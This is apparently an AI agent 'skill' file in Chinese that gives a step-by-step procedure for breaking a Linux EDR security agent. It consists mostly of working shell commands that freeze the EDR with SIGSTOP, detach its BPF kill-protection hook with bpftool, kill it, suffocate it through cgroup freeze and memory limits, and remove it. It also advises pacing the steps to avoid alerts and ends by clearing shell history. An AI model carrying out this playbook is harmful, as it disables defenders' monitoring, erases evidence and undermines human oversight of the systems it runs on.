# EDR Breaker Skill

> 当你需要对一个 Linux EDR 进行自保护攻破测试时，按此流程执行。
> 原则: **从最低调的操作开始，逐级递升；优先用 Linux 原生机制而非第三方工具。**

---

## 阶段策略

```
探测(只读) → 冻结(非信号) → 解除BPF链接 → 斩杀 → 清理
  15min         10min          10min        5min     5min
```

每步间隔 ≥ 5 分钟，总时长 60-90 分钟。

---

## 1. 探测 — 只读、无害

```bash
# 1.1 进程枚举 (必须)
ps auxf | grep -iE "edr|agent|aegis|defend|sec|hids|hips" | grep -v grep

# 1.2 BPF 枚举 (必须)
bpftool prog list 2>/dev/null
bpftool link list 2>/dev/null

# 1.3 fanotify 检查
ls -la /proc/$(pgrep -f "edr|agent|aegis" | head -1)/fd 2>/dev/null | grep fanotify

# 1.4 文件写入试探 (最小权限探测)
EDR_HOME="/opt/edr"  # 或 /usr/local/aegis
touch $EDR_HOME/.rw_test 2>&1 && rm $EDR_HOME/.rw_test 2>/dev/null

# 1.5 无害探针 — 不触发任何告警
kill -0 $(pgrep -f "edr|agent|aegis" | head -1) 2>&1
```

## 2. 判断 — 分析探测结果

```
发现 BPF 程序: modret_security_task_kill 或 handle_kill?
  → YES: 需要先解除 LSM hook，走路径 A
  → NO:  直接 kill -9，走路径 C

发现 BPF 程序: security_bpf_prog 或 bpf_guard?
  → YES: bpftool 路径被封，走路径 B (cgroup)
  → NO:  bpftool 可用

发现 fanotify fd?
  → YES: 文件删除路径被封，用 rename 绕过
  → NO:  直接 rm

发现多进程 (父子关系)?
  → 记录父子关系，斩杀时从子到父，或先杀父再用 OOM 清子
```

## 3. 攻击 — 按优先级选择路径

### 路径 A: SIGSTOP → bpftool → kill (通用最优)
```bash
# Step 1: 冻结
for pid in $(pgrep -f "edr|agent|aegis"); do kill -19 $pid; done; sleep 3

# Step 2: 找到并解除 LSM hook
LINK=$(bpftool link list 2>/dev/null | grep -B1 "security_task_kill\|handle_kill" | grep -oP '^\d+' | head -1)
[ -n "$LINK" ] && bpftool link detach id $LINK 2>/dev/null

# Step 3: 斩杀
for pid in $(pgrep -f "edr|agent|aegis"); do kill -9 $pid 2>/dev/null; done
```

### 路径 B: cgroup 窒息 (绕过信号机制)
```bash
# 适用于 EDR 有 bpf_guard 封堵 bpftool 的情况
EDR_PID=$(pgrep -f "edr|agent|aegis" | head -1)
CGPATH=$(cat /proc/$EDR_PID/cgroup | head -1 | cut -d: -f3)

echo 1 > /sys/fs/cgroup${CGPATH}/cgroup.freeze 2>/dev/null       # 冻结
echo 1M > /sys/fs/cgroup${CGPATH}/memory.max 2>/dev/null          # 限内存
echo 1000 > /proc/$EDR_PID/oom_score_adj 2>/dev/null               # OOM 首选
```

### 路径 C: 直接斩杀 (无 BPF/网关)
```bash
# EDR 无 BPF 自保护时直接使用
pkill -9 -f "edr|agent|aegis"
```

## 4. 清理

```bash
# 优先用 EDR 自身卸载 (避免留下 rm 痕迹)
/etc/init.d/aegis uninstall 2>/dev/null || /etc/init.d/edr-agent stop 2>/dev/null

# 否则用 mv 而非 rm
mv /opt/edr /tmp/.edr_disabled 2>/dev/null

# 等 60s 确认无复活
sleep 60
ps aux | grep -iE "edr|agent|aegis" | grep -v grep  # 应为空
```

## 5. 降噪原则

| 不要 | 应该 |
|------|------|
| 从 `kill -9` 开始 | 从 `kill -19` 开始 |
| 20分钟内完成全部操作 | 分散到 60-90 分钟 |
| `rm -rf` 批量删除 | `mv` 重命名，或利用 EDR 自身卸载 |
| 反复尝试同一攻击 | 失败后等 10 分钟换路径 |
| `ptrace` 直接附加 | 先用 `/proc/PID/mem` 读内存 |

## 6. 攻击后事项

- [ ] 检查是否有进程复活 (`ps aux | grep edr`)
- [ ] 检查是否有 BPF 残留 (`bpftool prog list | grep -c "edr\|aegis"`)
- [ ] 清理自身操作记录 (`history -c; rm ~/.bash_history`)
- [ ] 总结发现的所有漏洞
